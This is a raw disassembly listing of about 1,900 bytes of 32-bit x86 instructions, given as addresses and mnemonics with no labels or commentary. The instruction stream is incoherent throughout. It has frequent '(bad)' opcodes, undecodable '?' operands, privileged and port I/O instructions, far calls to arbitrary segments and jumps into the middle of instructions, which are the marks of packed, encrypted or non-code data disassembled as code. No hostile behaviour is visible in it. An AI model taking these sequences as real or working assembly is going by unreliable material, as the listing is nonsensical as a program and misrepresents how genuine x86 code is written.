  41a63e:	in     al,0x8a
  41a640:	sub    dh,al
  41a642:	adc    ah,BYTE PTR [edi]
  41a644:	mov    ?,WORD PTR [esi+ecx*8+0x3c2ae2f8]
  41a64b:	push   0x28
  41a64d:	inc    DWORD PTR [eax-0x20]
  41a650:	and    ch,bl
  41a652:	xchg   DWORD PTR [eax+esi*2],edx
  41a655:	mov    ds:0x88e80dec,eax
  41a65a:	gs test eax,0x9d4e6285
  41a660:	retf   
  41a661:	pop    ecx
  41a662:	jg     0x41a6dd
  41a664:	inc    ecx
  41a665:	aam    0xa9
  41a667:	xlat   BYTE PTR ds:[ebx]
  41a668:	jbe    0x41a615
  41a66a:	arpl   dx,ax
  41a66c:	ja     0x41a6d1
  41a66e:	lds    edi,FWORD PTR [ebx]
  41a670:	rcl    BYTE PTR [esp+edx*8],cl
  41a673:	add    bl,ah
  41a675:	sbb    dh,BYTE PTR [eax-0x41]
  41a678:	loop   0x41a673
  41a67a:	sub    eax,ebp
  41a67c:	push   ds
  41a67d:	aas    
  41a67e:	jns    0x41a6d9
  41a680:	jo     0x41a6f5
  41a682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a683:	repnz aad 0x2
  41a686:	push   0x6f
  41a688:	call   0x5945:0x968f7fd4
  41a68f:	into   
  41a690:	(bad)  
  41a691:	xor    ebx,DWORD PTR [edi-0x7b]
  41a694:	mov    ah,BYTE PTR [edx]
  41a696:	xchg   ebp,eax
  41a697:	cwde   
  41a698:	ja     0x41a623
  41a69a:	push   ebx
  41a69b:	frstor [eax]
  41a69d:	loop   0x41a713
  41a69f:	leave  
  41a6a0:	es das 
  41a6a2:	stc    
  41a6a3:	fdivrp st(7),st
  41a6a5:	xor    DWORD PTR [esi-0x449c9eb8],0x40
  41a6ac:	sub    ecx,DWORD PTR [ebp+0x7b]
  41a6af:	mov    edx,0x436d6a89
  41a6b4:	js     0x41a709
  41a6b6:	mov    cl,0x19
  41a6b8:	repnz lods al,BYTE PTR ds:[esi]
  41a6ba:	sub    eax,0xc62da811
  41a6bf:	das    
  41a6c0:	call   DWORD PTR [ebx+edi*4+0x29]
  41a6c4:	or     ah,cl
  41a6c6:	xor    DWORD PTR [ecx],esp
  41a6c8:	cli    
  41a6c9:	add    al,0x56
  41a6cb:	sti    
  41a6cc:	jb     0x41a67c
  41a6ce:	std    
  41a6cf:	ins    DWORD PTR es:[edi],dx
  41a6d0:	pop    ebp
  41a6d1:	push   eax
  41a6d2:	scas   eax,DWORD PTR es:[edi]
  41a6d3:	popf   
  41a6d4:	jb     0x41a6c0
  41a6d6:	mov    ds:0xa7b7cf04,eax
  41a6db:	xchg   DWORD PTR [edx-0x10],ecx
  41a6de:	mov    dh,ah
  41a6e0:	mov    al,ds:0xe6db098
  41a6e5:	mov    dl,0xd
  41a6e7:	push   ebp
  41a6e8:	dec    ebx
  41a6e9:	inc    ebx
  41a6ea:	sti    
  41a6eb:	dec    ebp
  41a6ec:	(bad)  
  41a6ed:	std    
  41a6ee:	clc    
  41a6ef:	xchg   ecx,eax
  41a6f0:	aas    
  41a6f1:	test   eax,0xc7442c45
  41a6f6:	repz sub BYTE PTR [ecx],dh
  41a6f9:	inc    esp
  41a6fa:	ins    DWORD PTR es:[edi],dx
  41a6fb:	add    esp,edi
  41a6fd:	pop    ss
  41a6fe:	test   ebp,edx
  41a700:	mov    ds:0xacab6c9b,al
  41a705:	rcr    DWORD PTR [edi-0x5969e2bb],1
  41a70b:	and    DWORD PTR [ecx+esi*2+0x4c6d907b],ecx
  41a712:	mov    dl,0x74
  41a714:	jbe    0x41a76e
  41a716:	adc    al,0x38
  41a718:	inc    ebx
  41a719:	dec    eax
  41a71a:	add    DWORD PTR [ecx-0x44080c08],esi
  41a720:	xchg   ebp,eax
  41a721:	lds    edi,FWORD PTR [edx+0x6f8fba9c]
  41a727:	pop    ebx
  41a728:	inc    edx
  41a729:	pop    edi
  41a72a:	ja     0x41a706
  41a72c:	adc    dl,BYTE PTR [ebx+0x4b]
  41a72f:	lds    esp,FWORD PTR [esi]
  41a731:	and    ebp,DWORD PTR [ebx]
  41a733:	retf   
  41a734:	push   cs
  41a735:	iret   
  41a736:	jmp    0x4260f230
  41a73b:	out    0xbd,al
  41a73d:	out    dx,al
  41a73e:	sbb    ecx,0x115a7f01
  41a744:	fsubr  QWORD PTR [edi+0x555a97d2]
  41a74a:	jg     0x41a790
  41a74c:	and    BYTE PTR [eax-0x65],cl
  41a74f:	or     BYTE PTR ds:0xdca1e71c,cl
  41a755:	ror    DWORD PTR [edi-0x5e79e62c],cl
  41a75b:	inc    edi
  41a75c:	dec    edx
  41a75d:	jle    0x41a768
  41a75f:	push   cs
  41a760:	adc    eax,0x508a0778
  41a765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a766:	mov    ebp,0xb9330f9c
  41a76b:	jae    0x41a76b
  41a76d:	addr16 or al,0x40
  41a770:	shl    DWORD PTR [ebp-0x66],0x28
  41a774:	mov    ebx,0x20df470f
  41a779:	mov    esp,0x97a33ddb
  41a77e:	xchg   ebx,eax
  41a77f:	xchg   ecx,eax
  41a780:	inc    ecx
  41a781:	lea    ebp,[edi-0x26338baa]
  41a787:	mov    ds:0xfd079b6b,ax
  41a78d:	mov    ecx,0xb57846c8
  41a792:	imul   edx,DWORD PTR [esi+0x5ffa6230],0xba208af8
  41a79c:	popa   
  41a79d:	jmp    0x41a7b2
  41a79f:	loop   0x41a77e
  41a7a1:	cmc    
  41a7a2:	adc    DWORD PTR [eax-0x17],edi
  41a7a5:	jp     0x41a746
  41a7a7:	inc    esi
  41a7a8:	imul   BYTE PTR [ecx]
  41a7aa:	inc    ecx
  41a7ab:	jb     0x41a810
  41a7ad:	mov    gs,ebx
  41a7af:	xchg   ebx,eax
  41a7b0:	push   edx
  41a7b1:	inc    edi
  41a7b2:	fisttp WORD PTR [edx]
  41a7b4:	push   es
  41a7b5:	adc    eax,0xb093ce2f
  41a7ba:	add    al,0x67
  41a7bc:	inc    esp
  41a7bd:	ror    DWORD PTR [ecx+0x756ba823],cl
  41a7c3:	jge    0x41a801
  41a7c5:	dec    edx
  41a7c6:	sbb    al,0x1d
  41a7c8:	mov    BYTE PTR [ecx],dh
  41a7ca:	dec    eax
  41a7cb:	inc    edx
  41a7cc:	or     eax,0x7a88004a
  41a7d1:	je     0x41a7e0
  41a7d3:	dec    ecx
  41a7d4:	into   
  41a7d5:	mov    eax,0xcc0c3724
  41a7da:	mov    ?,WORD PTR [edi+0x7]
  41a7dd:	into   
  41a7de:	lods   eax,DWORD PTR ds:[esi]
  41a7df:	mov    bh,BYTE PTR [ebp+edx*8-0x6f473cb2]
  41a7e6:	pop    ebx
  41a7e7:	and    DWORD PTR [edi+0x6602a9bd],ebp
  41a7ed:	ficomp WORD PTR ds:0xdd895aa0
  41a7f3:	icebp  
  41a7f4:	cmp    DWORD PTR [ebx],0xfc7c4aa4
  41a7fa:	or     BYTE PTR [ebp-0x44],ah
  41a7fd:	mov    ch,0x74
  41a7ff:	jns    0x41a7bd
  41a801:	mov    ebx,DWORD PTR [edi+0x28]
  41a804:	(bad)
  41a807:	add    al,0x62
  41a80a:	lock ret 0x9e62
  41a80e:	loop   0x41a84c
  41a810:	int    0x4d
  41a812:	xchg   edi,eax
  41a813:	jne    0x41a7d3
  41a815:	fidivr DWORD PTR [ebx+0x55]
  41a818:	aas    
  41a819:	aas    
  41a81a:	xchg   DWORD PTR ds:0xe6187ca2,edx
  41a820:	fimul  DWORD PTR [ecx]
  41a822:	ins    BYTE PTR es:[edi],dx
  41a823:	cli    
  41a824:	stos   DWORD PTR es:[edi],eax
  41a825:	call   0x96d10cb9
  41a82a:	jbe    0x41a85a
  41a82c:	ss call 0x701:0x12111f29
  41a834:	stos   BYTE PTR es:[edi],al
  41a835:	fist   WORD PTR [ecx]
  41a837:	jmp    0x41a80a
  41a839:	leave  
  41a83a:	jb     0x41a801
  41a83c:	jns    0x41a7e6
  41a83e:	xchg   esi,eax
  41a83f:	push   edx
  41a840:	push   es
  41a841:	pop    ebp
  41a842:	mov    eax,0x8109a344
  41a847:	stos   DWORD PTR es:[edi],eax
  41a848:	mov    eax,0xbd17e94e
  41a84d:	sbb    eax,DWORD PTR [ebx-0x39]
  41a850:	not    DWORD PTR [edi-0x2188ba94]
  41a856:	and    ah,BYTE PTR [ebp+0x5e]
  41a859:	pushf  
  41a85a:	push   0x53ed46e9
  41a85f:	je     0x41a875
  41a861:	not    DWORD PTR [ecx]
  41a863:	adc    DWORD PTR [ebp-0x1c5b1d47],esp
  41a869:	jnp    0x41a8c8
  41a86b:	add    eax,DWORD PTR [ecx+0x69]
  41a86e:	push   esp
  41a86f:	mov    DWORD PTR [ebx],ebx
  41a871:	cmp    al,0xf3
  41a873:	mov    dh,0x7b
  41a875:	add    dl,al
  41a877:	aad    0xbf
  41a879:	mov    ds:0x738e1e3b,eax
  41a87e:	fsub   DWORD PTR [esi+0x33]
  41a881:	outs   dx,DWORD PTR ds:[esi]
  41a882:	int    0x5a
  41a884:	mov    ch,0xf7
  41a886:	or     al,0x8e
  41a888:	popf   
  41a889:	loop   0x41a864
  41a88b:	mov    ch,0xc8
  41a88d:	loope  0x41a8e8
  41a88f:	sub    eax,ebx
  41a891:	(bad)  
  41a892:	cli    
  41a893:	retf   0xc41a
  41a896:	ds int3 
  41a898:	ret    
  41a899:	push   es
  41a89a:	aad    0x1e
  41a89c:	cmp    eax,DWORD PTR [edx]
  41a89e:	dec    eax
  41a89f:	out    0x80,al
  41a8a1:	test   BYTE PTR [ecx+0x2a],cl
  41a8a4:	in     al,dx
  41a8a5:	xor    dl,ah
  41a8a7:	jl     0x41a8cb
  41a8a9:	es ja  0x41a853
  41a8ac:	dec    ecx
  41a8ad:	lods   eax,DWORD PTR ds:[esi]
  41a8ae:	sbb    eax,0x53e1498d
  41a8b3:	push   cs
  41a8b4:	call   0xf608d39e
  41a8b9:	sub    BYTE PTR [ebp+0x7f],ah
  41a8bc:	add    BYTE PTR [edi],ah
  41a8be:	mov    bl,0x65
  41a8c0:	mov    ebx,DWORD PTR ds:0x193f15de
  41a8c6:	push   0x3655d54b
  41a8cb:	cmp    DWORD PTR [ebp+0x787e458a],esp
  41a8d1:	lds    esi,FWORD PTR [ebp+ebp*1-0x4e]
  41a8d5:	ss ins DWORD PTR es:[edi],dx
  41a8d7:	jo     0x41a8b6
  41a8d9:	cli    
  41a8da:	test   DWORD PTR ss:[ebx-0x66],0xcee77db4
  41a8e2:	sub    eax,0x13e038a5
  41a8e7:	ins    DWORD PTR es:[edi],dx
  41a8e8:	pusha  
  41a8e9:	and    eax,0xfdea56f
  41a8ee:	fcomp  QWORD PTR [esi+ebp*2+0x7]
  41a8f2:	push   cs
  41a8f3:	pop    ecx
  41a8f4:	dec    eax
  41a8f5:	pop    ebp
  41a8f6:	mov    al,ds:0x6c67de29
  41a8fb:	sbb    eax,0x9ec1307
  41a900:	in     al,dx
  41a901:	test   dl,al
  41a903:	lock push ecx
  41a905:	pop    edi
  41a906:	bnd jne 0x41a974
  41a909:	jl     0x41a8a7
  41a90b:	addr16 jmp 0x6f76:0xadb2a321
  41a913:	(bad)  [esi-0x4b5a2e1a]
  41a919:	(bad)  
  41a91a:	fidiv  DWORD PTR [edi-0x16]
  41a91d:	sub    DWORD PTR [edx+0x3],eax
  41a920:	dec    edi
  41a921:	mov    bh,bh
  41a923:	jl     0x41a8b2
  41a925:	push   eax
  41a926:	jg     0x41a945
  41a928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a929:	sbb    al,0x4b
  41a92b:	nop
  41a92c:	call   0x228c7b7c
  41a931:	out    dx,al
  41a932:	xchg   ecx,ebp
  41a934:	push   ss
  41a935:	retf   0x6c5b
  41a938:	cmp    ebp,ebp
  41a93a:	data16 aam 0x5f
  41a93d:	jge    0x41a991
  41a93f:	cwde   
  41a940:	out    0x68,eax
  41a942:	pushf  
  41a943:	push   ecx
  41a944:	push   esp
  41a945:	inc    edx
  41a946:	fstp   DWORD PTR [esi-0x6e7653dc]
  41a94c:	add    DWORD PTR [edi+esi*2-0x7b],esi
  41a950:	inc    esp
  41a951:	mov    es,WORD PTR [ecx-0x42]
  41a954:	xor    DWORD PTR [esp+esi*1+0x3654ecb],ecx
  41a95b:	int3   
  41a95c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a95e:	mov    al,0x7c
  41a960:	pop    esi
  41a961:	aam    0x12
  41a963:	sub    ebp,DWORD PTR [edi]
  41a965:	ldmxcsr DWORD PTR ds:0xd53c94cc
  41a96c:	fcom   DWORD PTR [edi+0x43dab20a]
  41a972:	int3   
  41a973:	mov    ds:0x6d72af2d,eax
  41a978:	aad    0xc4
  41a97a:	jmp    0x41a97c
  41a97c:	dec    ebx
  41a97d:	sbb    eax,0xe63e2cce
  41a982:	sbb    al,0xbf
  41a984:	mov    ds:0xbab31989,eax
  41a989:	les    edi,FWORD PTR [edi]
  41a98b:	cmp    ah,BYTE PTR [ebx-0x700c44c5]
  41a991:	ins    DWORD PTR es:[edi],dx
  41a992:	cmp    dh,bl
  41a994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a995:	mov    ebx,0xa06682f9
  41a99a:	scas   al,BYTE PTR es:[edi]
  41a99b:	xchg   DWORD PTR [esi-0x14],edx
  41a99e:	loopne 0x41a9f8
  41a9a0:	jbe    0x41aa12
  41a9a2:	add    BYTE PTR [edx],dh
  41a9a4:	out    0x3e,al
  41a9a6:	daa    
  41a9a7:	push   0x68672e7
  41a9ac:	pop    ebp
  41a9ad:	fst    st(6)
  41a9af:	daa    
  41a9b0:	hlt    
  41a9b1:	jae    0x41a9c4
  41a9b3:	(bad)  
  41a9b4:	or     esi,esi
  41a9b6:	out    0xac,eax
  41a9b8:	and    DWORD PTR [esi],0xc99dbb20
  41a9be:	sar    DWORD PTR [ebx-0xa087a06],1
  41a9c4:	aaa    
  41a9c5:	push   esi
  41a9c6:	add    DWORD PTR ds:0xcf5bcbe2,ecx
  41a9cc:	cmc    
  41a9cd:	cmp    edi,esi
  41a9cf:	pop    edx
  41a9d0:	sbb    eax,0xf1769f37
	...
  41a9e1:	inc    ebx
  41a9e2:	clc    
  41a9e3:	gs sbb edi,edi
  41a9e6:	popf   
  41a9e7:	jg     0x41a9e3
  41a9e9:	mov    al,0x88
  41a9eb:	dec    ebp
  41a9ec:	sahf   
  41a9ed:	xchg   edi,eax
  41a9ee:	loope  0x41aa5c
  41a9f0:	pop    ecx
  41a9f1:	imul   esp,DWORD PTR [edi],0x3ac0001
  41a9f7:	add    BYTE PTR [eax],al
  41a9f9:	cdq    
  41a9fa:	jb     0x41aa79
  41a9fc:	mov    al,ds:0x4ff47f1a
  41aa01:	add    al,0x4
  41aa03:	sub    eax,0x95a0f45
  41aa08:	ret    
  41aa09:	mov    ds:0xf03a0691,eax
  41aa0e:	lds    eax,FWORD PTR [edi]
  41aa10:	sbb    BYTE PTR [esi+0x42],ah
  41aa13:	(bad)  
  41aa14:	pop    ebx
  41aa15:	(bad)  
  41aa16:	loop   0x41aa74
  41aa18:	dec    esi
  41aa19:	xor    eax,0xa1ab9c22
  41aa1e:	mov    ebp,0x9d926189
  41aa23:	pushf  
  41aa24:	loope  0x41aa39
  41aa26:	sbb    DWORD PTR [ecx+0x51],eax
  41aa29:	adc    DWORD PTR [ebp+edx*8+0x7e583592],edi
  41aa30:	sbb    al,0x30
  41aa32:	aaa    
  41aa33:	mov    cl,BYTE PTR [esp+eiz*2+0x60]
  41aa37:	imul   esp,DWORD PTR [ecx+ebp*2+0x1f77a68b],0x56
  41aa3f:	ins    DWORD PTR es:[edi],dx
  41aa40:	cmc    
  41aa41:	dec    edi
  41aa42:	iret   
  41aa43:	cmc    
  41aa44:	mov    DWORD PTR [eax-0x27],edx
  41aa47:	ficom  DWORD PTR [esi-0x3f9b125c]
  41aa4d:	and    DWORD PTR [eax],esi
  41aa4f:	fdiv   DWORD PTR [esi-0x3d]
  41aa52:	ffreep st(5)
  41aa54:	xor    al,BYTE PTR [ebx+0x55a93fab]
  41aa5a:	sbb    bl,BYTE PTR [ebx]
  41aa5c:	test   DWORD PTR [edi+0x76],ecx
  41aa5f:	adc    dl,dh
  41aa61:	in     al,0x28
  41aa63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa64:	ret    0x8e1a
  41aa67:	retf   
  41aa68:	hlt    
  41aa69:	push   ebp
  41aa6a:	ds out 0x40,eax
  41aa6d:	cld    
  41aa6e:	pop    es
  41aa6f:	mov    eax,ds:0xb5543292
  41aa74:	jae    0x41aab9
  41aa76:	scas   eax,DWORD PTR es:[edi]
  41aa77:	inc    eax
  41aa78:	fidiv  WORD PTR [esi-0x2f2a4b5c]
  41aa7e:	mov    bh,0xc5
  41aa80:	cwde   
  41aa81:	jne    0x41aad1
  41aa83:	(bad)  
  41aa84:	xchg   ebx,eax
  41aa85:	pop    esp
  41aa86:	jae    0x41aada
  41aa88:	test   DWORD PTR [ebp+0x5d4a26c1],esi
  41aa8e:	ins    BYTE PTR es:[edi],dx
  41aa8f:	inc    edx
  41aa90:	iret   
  41aa91:	ss int 0xc6
  41aa94:	bound  edi,QWORD PTR [edi]
  41aa96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa97:	inc    ebx
  41aa98:	sahf   
  41aa99:	inc    esp
  41aa9a:	ins    BYTE PTR es:[edi],dx
  41aa9b:	lock or BYTE PTR [esi-0x12],ch
  41aa9f:	push   eax
  41aaa0:	cli    
  41aaa1:	push   es
  41aaa2:	ins    DWORD PTR es:[edi],dx
  41aaa3:	fild   WORD PTR [ecx-0x453bb2e2]
  41aaa9:	or     eax,0x813e0dbe
  41aaae:	add    eax,0x13ba88fd
  41aab3:	adc    al,0x31
  41aab5:	or     al,0x48
  41aab7:	push   0x2eabe347
  41aabc:	test   eax,0x3c30438f
  41aac1:	xchg   DWORD PTR [ebp+0x327f34ee],ebx
  41aac7:	xlat   BYTE PTR ds:[ebx]
  41aac8:	dec    esp
  41aac9:	int3   
  41aaca:	xor    DWORD PTR [esp+ecx*1+0x72],eax
  41aace:	sub    DWORD PTR [edi+ebp*2+0x5190434d],0x4446497a
  41aad9:	test   DWORD PTR [esi+eiz*2+0x353802d7],eax
  41aae0:	cli    
  41aae1:	cwde   
  41aae2:	push   ecx
  41aae3:	test   al,0x44
  41aae5:	push   ebx
  41aae6:	xchg   BYTE PTR [edi+0x6c],dh
  41aae9:	and    eax,0x4c601fd4
  41aaee:	sahf   
  41aaef:	sbb    ecx,DWORD PTR [esi-0x53]
  41aaf2:	mov    cl,0x43
  41aaf4:	sub    ah,BYTE PTR [edx+0x236f5f21]
  41aafa:	cmp    ecx,DWORD PTR [esp+edi*8-0x6e2fbc3d]
  41ab01:	sbb    BYTE PTR [ebp+0x31233b80],0xd7
  41ab08:	icebp  
  41ab09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab0a:	lods   al,BYTE PTR ds:[esi]
  41ab0b:	into   
  41ab0c:	dec    ebp
  41ab0d:	sub    eax,0x6456ceaa
  41ab12:	add    ebp,DWORD PTR [ebp+0x72d3e0ec]
  41ab18:	aas    
  41ab19:	(bad)  
  41ab1b:	mov    ds:0xe9fc87ba,eax
  41ab20:	mov    edx,es
  41ab22:	(bad)  
  41ab24:	adc    DWORD PTR [ecx-0x11bc6036],0x57924332
  41ab2e:	(bad)  
  41ab2f:	stos   DWORD PTR es:[edi],eax
  41ab30:	mov    ah,0x8b
  41ab32:	or     DWORD PTR [esp+ecx*1-0x78408bd0],eax
  41ab39:	or     bl,BYTE PTR [edx]
  41ab3b:	std    
  41ab3c:	shl    DWORD PTR [edi],0x1d
  41ab3f:	xor    eax,0x7a11bde3
  41ab44:	dec    esp
  41ab45:	mov    esi,DWORD PTR [esi+0x6cd60cc]
  41ab4b:	fiadd  WORD PTR [edx]
  41ab4d:	dec    ebp
  41ab4e:	inc    esp
  41ab4f:	dec    esp
  41ab50:	icebp  
  41ab51:	push   edx
  41ab52:	cmp    BYTE PTR [edi-0x6b6ccd8e],0x24
  41ab59:	or     bh,0x7f
  41ab5c:	pop    es
  41ab5d:	sub    BYTE PTR ds:0x97680a92,bl
  41ab63:	mov    DWORD PTR [ebp-0xcf3fe31],ebx
  41ab69:	test   BYTE PTR [edx-0x47006acd],dh
  41ab6f:	call   0x72d:0x33d7683c
  41ab76:	in     al,dx
  41ab77:	add    DWORD PTR [ebp-0x2],ebx
  41ab7a:	pop    ds
  41ab7b:	repnz mov ds:0xf382e27c,al
  41ab81:	stos   BYTE PTR es:[edi],al
  41ab82:	dec    ecx
  41ab83:	lods   eax,DWORD PTR ds:[esi]
  41ab84:	test   BYTE PTR cs:[eax+0x394e2beb],0x80
  41ab8c:	cmp    esp,DWORD PTR [esi+0x2562308c]
  41ab92:	cwde   
  41ab93:	out    dx,al
  41ab94:	fild   QWORD PTR [esi+esi*8+0x2b]
  41ab98:	push   ss
  41ab99:	pop    esi
  41ab9a:	ret    0xafd6
  41ab9d:	push   ecx
  41ab9e:	clc    
  41ab9f:	jg     0x41ab7b
  41aba1:	mov    al,BYTE PTR [edx-0x5caaca55]
  41aba7:	(bad)
  41abab:	retf   0x1546
  41abae:	xor    al,0x38
  41abb0:	(bad)  
  41abb1:	aas    
  41abb2:	sbb    eax,0x16301340
  41abb7:	rcl    BYTE PTR [edx-0x7c],1
  41abba:	mov    bl,0x59
  41abbc:	test   al,bh
  41abbe:	fs or  eax,0x1daa17c3
  41abc4:	pusha  
  41abc5:	sub    BYTE PTR [ebp+0x5902f5b8],ch
  41abcb:	enter  0x2a33,0xb0
  41abcf:	mov    bh,0x8a
  41abd1:	sub    eax,0x286fbadd
  41abd6:	(bad)  
  41abd7:	iret   
  41abd8:	fisttp DWORD PTR [esi+0x42]
  41abdb:	mov    WORD PTR [esi],ds
  41abdd:	ins    BYTE PTR es:[edi],dx
  41abde:	mov    bh,0x24
  41abe0:	test   DWORD PTR [edi-0x55],edx
  41abe3:	mov    ch,0x1
  41abe5:	sahf   
  41abe6:	mov    eax,ds:0xe4ed0331
  41abeb:	sbb    eax,DWORD PTR [edx-0x5dc5d7cf]
  41abf1:	jns    0x41ab89
  41abf3:	jmp    edx
  41abf5:	or     ecx,esp
  41abf7:	pop    esp
  41abf8:	sub    cl,ah
  41abfa:	jae    0x41abc5
  41abfc:	call   0x465cf4c2
  41ac01:	jmp    0x8e6decd
  41ac06:	(bad)  
  41ac07:	xor    DWORD PTR ds:[eax+0x2f],edx
  41ac0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac0c:	cmp    al,0xcf
  41ac0e:	sub    eax,0x852ec9a6
  41ac13:	addr16 or cl,bl
  41ac16:	iret   
  41ac17:	mov    BYTE PTR [ecx+0xa],0x3a
  41ac1b:	das    
  41ac1c:	mov    WORD PTR [edx],?
  41ac1e:	jecxz  0x41ac91
  41ac20:	outs   dx,BYTE PTR ds:[esi]
  41ac21:	and    BYTE PTR [esi+edx*2+0x51],al
  41ac25:	dec    esp
  41ac26:	sti    
  41ac27:	out    dx,al
  41ac28:	(bad)  
  41ac29:	and    al,0x36
  41ac2b:	jno    0x41ac4c
  41ac2d:	and    eax,0x4b9caebe
  41ac32:	das    
  41ac33:	dec    esi
  41ac34:	shr    DWORD PTR [eax],1
  41ac36:	retf   0x63ac
  41ac39:	scas   al,BYTE PTR es:[edi]
  41ac3a:	out    0xe6,eax
  41ac3c:	js     0x41ac36
  41ac3e:	inc    ebx
  41ac3f:	popa   
  41ac40:	inc    edx
  41ac41:	enter  0x183c,0xa8
  41ac45:	aaa    
  41ac46:	icebp  
  41ac47:	cdq    
  41ac48:	test   BYTE PTR es:[edx-0x1f],ah
  41ac4c:	(bad)  
  41ac4d:	out    0x55,al
  41ac4f:	mov    al,0xb1
  41ac51:	mov    al,0x7f
  41ac53:	xor    al,0x26
  41ac55:	aad    0x6a
  41ac57:	mov    ebp,0x31d53e1b
  41ac5c:	loopne 0x41ac88
  41ac5e:	cwde   
  41ac5f:	push   ebp
  41ac60:	(bad)  
  41ac61:	clc    
  41ac62:	inc    esp
  41ac63:	sub    eax,0x67ddd6b6
  41ac68:	cmc    
  41ac69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac6a:	dec    ecx
  41ac6b:	xlat   BYTE PTR ds:[ebx]
  41ac6c:	stos   BYTE PTR es:[edi],al
  41ac6d:	clc    
  41ac6e:	jle    0x41abfa
  41ac70:	sbb    BYTE PTR ds:0x648fea01,dl
  41ac76:	xchg   BYTE PTR [eax+esi*2],ch
  41ac79:	adc    BYTE PTR [esi],bh
  41ac7b:	sub    DWORD PTR [ebp+0x30],ecx
  41ac7e:	and    BYTE PTR [esi+0x6d],bl
  41ac81:	mov    esi,0x4c07bba7
  41ac86:	inc    edi
  41ac87:	pop    esp
  41ac88:	jo     0x41ac1e
  41ac8a:	add    ebp,DWORD PTR [ecx+0x62]
  41ac8d:	leave  
  41ac8e:	cmp    DWORD PTR [edi+0x2e12114a],eax
  41ac94:	ficom  DWORD PTR [ecx-0x3a]
  41ac97:	leave  
  41ac98:	dec    ebp
  41ac99:	loope  0x41acad
  41ac9b:	mov    ecx,0x7dd7bc80
  41aca0:	in     eax,dx
  41aca1:	js     0x41acf2
  41aca3:	and    edx,DWORD PTR [ecx-0x3c]
  41aca6:	in     eax,dx
  41aca7:	out    0xa4,al
  41aca9:	sbb    dl,cl
  41acab:	fisub  WORD PTR ds:0x1fdd2b77
  41acb1:	jbe    0x41ad14
  41acb3:	inc    edx
  41acb4:	aad    0xc3
  41acb6:	mov    al,0x53
  41acb9:	dec    ebp
  41acba:	(bad)  ds:0x68dbfa2c
  41acc0:	retf   0xb3ff
  41acc3:	inc    edx
  41acc4:	cmp    BYTE PTR [ecx+0x2e],dh
  41acc7:	enter  0x85cf,0xc6
  41accb:	scas   eax,DWORD PTR es:[edi]
  41accc:	(bad)  [eax]
  41acce:	pop    ss
  41accf:	pop    ecx
  41acd0:	leave  
  41acd1:	sbb    eax,0xb7b58ed6
  41acd6:	mov    eax,0xb335a449
  41acdb:	mov    al,0x8a
  41acdd:	sub    eax,0x8add8a32
  41ace2:	mov    edx,0xe87f55a6
  41ace7:	(bad)  
  41ace8:	(bad)  
  41ace9:	loop   0x41aced
  41aceb:	cmp    al,0xd
  41aced:	xchg   edi,edi
  41acef:	cs sub eax,0x6b4e0170
  41acf5:	aaa    
  41acf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acf7:	push   edx
  41acf8:	jge    0x41acc8
  41acfa:	dec    edx
  41acfb:	mov    gs:0x7cd7b92f,eax
  41ad01:	outs   dx,DWORD PTR ds:[esi]
  41ad02:	cmp    al,0xfb
  41ad04:	add    DWORD PTR [edx],0xcc017072
  41ad0a:	or     eax,esp
  41ad0c:	mov    ds:0x544ab274,al
  41ad11:	fucomi st,st(3)
  41ad13:	push   esp
  41ad14:	jmp    0xc1949cb6
  41ad19:	xchg   ebp,eax
  41ad1a:	mov    bl,0xe5
  41ad1c:	ja     0x41ad93
  41ad1e:	jae    0x41ad4d
  41ad20:	dec    ebp
  41ad21:	or     eax,DWORD PTR [ecx]
  41ad23:	je     0x41ad67
  41ad25:	mov    esp,0x932e5c28
  41ad2a:	add    DWORD PTR [ecx-0x54],esp
  41ad2d:	sbb    BYTE PTR [eax],cl
  41ad2f:	mov    esp,DWORD PTR [ecx*2+0x584ac98a]
  41ad36:	sti    
  41ad37:	nop
  41ad38:	and    ebx,0xffffffc6
  41ad3b:	imul   eax,DWORD PTR [edi-0x4e],0x78
  41ad3f:	inc    esi
  41ad40:	xor    DWORD PTR [esi-0x8],ecx
  41ad43:	nop
  41ad44:	je     0x41adb7
  41ad46:	adc    al,0x1a
  41ad48:	mov    cl,0xb6
  41ad4a:	adc    BYTE PTR [esi],dl
  41ad4c:	xlat   BYTE PTR ds:[ebx]
  41ad4d:	add    al,0x24
  41ad4f:	push   ds
  41ad50:	out    0xc2,eax
  41ad52:	jo     0x41ad60
  41ad54:	xor    BYTE PTR [ebx+edi*1+0x50f231ec],ch
  41ad5b:	sbb    eax,0x760628a2
  41ad60:	inc    ebp
  41ad61:	iret   
  41ad62:	test   eax,0x8b21dc75
  41ad67:	dec    ecx
  41ad68:	popf   
  41ad69:	mov    bl,0x5b
  41ad6b:	aam    0x9a
  41ad6d:	pop    ecx
  41ad6e:	mov    ds:0xed37a55f,eax
  41ad73:	mov    WORD PTR [edx-0x8611f9d],?
  41ad79:	and    al,0x58
  41ad7b:	and    eax,0xfb01969d
  41ad80:	int3   
  41ad81:	jo     0x41ad39
  41ad83:	jb     0x41add5
  41ad85:	and    esi,DWORD PTR [edi+0x63272d7c]
  41ad8b:	sbb    DWORD PTR [ebx+0x1e391c4e],edi
  41ad91:	xchg   DWORD PTR [eax],eax
  41ad93:	jecxz  0x41ad34
  41ad95:	jmp    0x41adff
  41ad97:	das    
  41ad98:	fldl2e 
  41ad9a:	pop    ebx
  41ad9b:	or     eax,0x1606013a
  41ada0:	dec    cx
  41ada2:	dec    eax
  41ada3:	stos   DWORD PTR es:[edi],eax
  41ada4:	push   edi
	...
  41adb1:	pop    es
  41adb2:	sbb    BYTE PTR [esi+0x3fbf9fa7],0xa2
  41adb9:	dec    eax
  41adba:	imul   ebx,DWORD PTR [eax+edx*4+0xfa0181a],0x15
  41adc2:	sub    eax,DWORD PTR [ecx]
  41adc4:	add    BYTE PTR [ebx+eax*1-0x40630000],ch
  41adcb:	lods   eax,DWORD PTR ds:[esi]
  41adcc:	scas   eax,DWORD PTR es:[edi]
  41adcd:	dec    edi
  41adce:	xlat   BYTE PTR ds:[ebx]
